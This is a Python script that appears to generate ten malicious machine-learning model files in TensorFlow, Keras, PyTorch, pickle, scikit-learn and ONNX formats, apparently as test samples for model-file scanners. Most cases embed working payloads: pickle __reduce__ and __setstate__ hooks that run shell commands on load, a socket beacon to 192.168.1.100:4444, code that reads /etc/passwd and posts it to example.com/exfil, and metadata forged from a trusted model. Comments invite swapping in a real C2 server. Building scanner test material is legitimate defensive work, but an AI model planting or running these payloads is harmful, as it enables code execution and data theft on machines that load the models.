import tensorflow as tf
from tensorflow.keras import layers
import torch
import torch.nn as nn
import onnx
from onnx import helper, TensorProto
import pickle
import joblib
from sklearn.linear_model import LinearRegression
import zipfile
import base64
import os
import socket
import requests

# Define SimpleModel for PyTorch-based test cases
class SimpleModel(nn.Module):
    def __init__(self):
        super(SimpleModel, self).__init__()
        self.linear = nn.Linear(1, 1)
    def forward(self, x):
        return self.linear(x)

# Define MaliciousModel for Test Case 4 at the module level to avoid pickling issues
class MaliciousModelForTestCase4(nn.Module):
    def __init__(self):
        super(MaliciousModelForTestCase4, self).__init__()
        self.linear = nn.Linear(10, 1)
    def __setstate__(self, state):
        super(MaliciousModelForTestCase4, self).__setstate__(state)
        os.system('echo Malicious code executed! (PyTorch .pt) > /tmp/malicious.txt')
        eicar_payload()  # Embed EICAR payload upon deserialization

# Payload functions
def eicar_payload():
    """Writes the EICAR test string to a file."""
    with open('/tmp/eicar.com', 'w') as f:
        f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

def c2_payload():
    """Establishes a connection to a C2 server."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.100', 4444))  # Replace with your C2 server IP and port
    s.sendall(b'Connected')
    s.close()

def data_exfil_payload():
    """Exfiltrates sensitive data to an external server."""
    with open('/etc/passwd', 'r') as f:
        data = f.read()
    requests.post('http://example.com/exfil', data={'data': data})  # Replace with your server URL

# Test Case 1: Malicious Payload in .pb Graph (TensorFlow) + EICAR
def generate_test_case_1():
    """Malicious Payload in .pb Graph (TensorFlow) + EICAR"""
    def malicious_function(x):
        os.system("echo 'Malicious code executed! (TF .pb)' > /tmp/malicious.txt")
        eicar_payload()  # Add EICAR payload
        return x
    inputs = tf.keras.Input(shape=(10,))
    x = layers.Dense(10)(inputs)
    x = layers.Lambda(malicious_function, output_shape=(10,))(x)  # Specify output_shape
    outputs = layers.Dense(1)(x)
    model = tf.keras.Model(inputs, outputs)
    tf.saved_model.save(model, "./malicious_model_tf_pb")
    print("Test case 1 generated: malicious_model_tf_pb")

# Test Case 2: Obfuscated Code in .h5 (Keras) + C2 Connection
def generate_test_case_2():
    """Obfuscated Code in .h5 (Keras) + C2 Connection"""
    def malicious_function(x):
        os.system("echo 'Malicious code executed! (Keras .h5)' > /tmp/malicious.txt")
        c2_payload()  # Add C2 payload
        return x
    inputs = tf.keras.Input(shape=(10,))
    x = layers.Dense(10)(inputs)
    x = layers.Lambda(malicious_function, output_shape=(10,))(x)  # Specify output_shape
    outputs = layers.Dense(1)(x)
    model = tf.keras.Model(inputs, outputs)
    model.save("./malicious_model_keras.h5")
    print("Test case 2 generated: malicious_model_keras.h5")

# Test Case 3: Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration
def generate_test_case_3():
    """Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration"""
    inputs = tf.keras.Input(shape=(10,))
    outputs = layers.Dense(1)(inputs)
    model = tf.keras.Model(inputs, outputs)
    model_save_path = "./malicious_saved_model_trojanized"
    tf.saved_model.save(model, model_save_path)
    assets_dir = os.path.join(model_save_path, 'assets')
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'malicious.py'), 'w') as f:
        f.write("""
import os
import requests

# Execute malicious behavior
os.system('echo Malicious code executed! (Trojanized SavedModel) > /tmp/malicious.txt')

# Data exfiltration
with open('/etc/passwd', 'r') as f:
    data = f.read()
requests.post('http://example.com/exfil', data={'data': data})
""".strip())
    print("Test case 3 generated: malicious_saved_model_trojanized")

# Test Case 4: Code Injection in .pt / .pth Checkpoints (PyTorch) + EICAR
def generate_test_case_4():
    """Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models) + EICAR"""
    model = MaliciousModelForTestCase4()  # Use the module-level class
    torch.save(model, 'malicious_model_pytorch.pt')
    print("Test case 4 generated: malicious_model_pytorch.pt")

# Test Case 5: Malicious Script in .pkl (Pickle) + C2 Connection
def generate_test_case_5():
    """Malicious Script in .pkl (Pickle) + C2 Connection"""
    class MaliciousObject:
        def __reduce__(self):
            cmd = ("echo Malicious code executed! (Pickle .pkl) > /tmp/malicious.txt && " +
                   "python -c \"import socket; s=socket.socket(); s.connect(('192.168.1.100',4444)); s.sendall(b'Connected'); s.close()\"")
            return (os.system, (cmd,))
    malicious_obj = MaliciousObject()
    with open('malicious_pkl_file.pkl', 'wb') as f:
        pickle.dump(malicious_obj, f)
    print("Test case 5 generated: malicious_pkl_file.pkl")

# Test Case 6: Hidden Payload in ONNX Metadata + Data Exfiltration
def generate_test_case_6():
    """Hidden Payload in ONNX Metadata + Data Exfiltration"""
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'test_model', [input], [output])
    model = helper.make_model(graph)
    model.metadata_props.add(key="hidden_payload", value="echo Malicious code executed! (ONNX Metadata) > /tmp/malicious.txt")
    model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
    onnx.save(model, 'malicious_onnx_model_metadata.onnx')
    print("Test case 6 generated: malicious_onnx_model_metadata.onnx")

# Test Case 7: Large Encoded Blobs in Node Attributes (ONNX) + EICAR
def generate_test_case_7():
    """Large Encoded Blobs in Node Attributes (ONNX) + EICAR"""
    malicious_code = "echo Malicious code executed! (ONNX Node Attributes) > /tmp/malicious.txt && " + \
                     "echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com"
    encoded_malicious_code = base64.b64encode(malicious_code.encode()).decode()
    node = helper.make_node('CustomOp', ['input'], ['output'], domain='custom', attr_str=encoded_malicious_code)
    graph = helper.make_graph([node], 'test_model', [],[])
    model = helper.make_model(graph)
    onnx.save(model, 'malicious_onnx_model_node_attributes.onnx')
    print("Test case 7 generated: malicious_onnx_model_node_attributes.onnx")

# Test Case 8: Malicious Code in scikit-learn .joblib or .pkl + C2 Connection
def generate_test_case_8():
    """Malicious Code in scikit-learn .joblib or .pkl + C2 Connection"""
    class MaliciousObject:
        def __reduce__(self):
            cmd = ("echo Malicious code executed! (Scikit-learn .joblib) > /tmp/malicious.txt && " +
                   "python -c \"import socket; s=socket.socket(); s.connect(('192.168.1.100',4444)); s.sendall(b'Connected'); s.close()\"")
            return (os.system, (cmd,))
    model = LinearRegression()
    model.__dict__['malicious'] = MaliciousObject()
    joblib.dump(model, 'malicious_model_sklearn.joblib')
    print("Test case 8 generated: malicious_model_sklearn.joblib")

# Test Case 9: Signature Forging or Tampered Metadata (Other AI Model Formats) + Data Exfiltration
def generate_test_case_9():
    """Signature Forging or Tampered Metadata (Other AI Model Formats) + Data Exfiltration"""
    if not os.path.exists('trusted_model.onnx'):
        print("Error: trusted_model.onnx not found. Please provide a trusted ONNX model.")
        return
    trusted_model = onnx.load('trusted_model.onnx')
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'malicious_model', [input], [output])
    malicious_model = helper.make_model(graph)
    malicious_model.producer_name = trusted_model.producer_name
    malicious_model.producer_version = trusted_model.producer_version
    malicious_model.domain = trusted_model.domain
    malicious_model.model_version = trusted_model.model_version
    malicious_model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
    onnx.save(malicious_model, 'forged_malicious_onnx_model.onnx')
    print("Test case 9 generated: forged_malicious_onnx_model.onnx")

# Test Case 10: Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR
def generate_test_case_10():
    """Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR"""
    model = SimpleModel()
    torch.save(model, 'model.pt')
    password = 'secret'
    with zipfile.ZipFile('encrypted_model.zip', 'w') as zip_file:
        zip_file.setpassword(password.encode())
        zip_file.write('model.pt', arcname='model.pt')
        zip_file.writestr('eicar.py', """
with open('/tmp/eicar.com', 'w') as f:
    f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
""".strip())
    print("Test case 10 generated: encrypted_model.zip")

# Main function to handle user input and generate test cases
def main():
    test_cases = {
        '1': generate_test_case_1,
        '2': generate_test_case_2,
        '3': generate_test_case_3,
        '4': generate_test_case_4,
        '5': generate_test_case_5,
        '6': generate_test_case_6,
        '7': generate_test_case_7,
        '8': generate_test_case_8,
        '9': generate_test_case_9,
        '10': generate_test_case_10
    }

    print("Select a test case to generate (1-10) or 'all' to generate all:")
    print("1. Malicious Payload in .pb Graph (TensorFlow-Based Models) + EICAR")
    print("2. Obfuscated Code in .h5 (Keras) + C2 Connection")
    print("3. Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration")
    print("4. Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models) + EICAR")
    print("5. Malicious Script in .pkl (Pickle) + C2 Connection")
    print("6. Hidden Payload in ONNX Metadata (ONNX Models) + Data Exfiltration")
    print("7. Large Encoded Blobs in Node Attributes (ONNX Models) + EICAR")
    print("8. Malicious Code in scikit-learn .joblib or .pkl + C2 Connection")
    print("9. Signature Forging or Tampered Metadata (Other AI Model Formats) + Data Exfiltration")
    print("10. Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR")

    choice = input("Enter your choice: ").strip().lower()

    if choice == 'all':
        for func in test_cases.values():
            func()
    elif choice in test_cases:
        test_cases[choice]()
    else:
        print("Invalid choice. Please enter a number between 1 and 10 or 'all'.")

if __name__ == "__main__":
    main()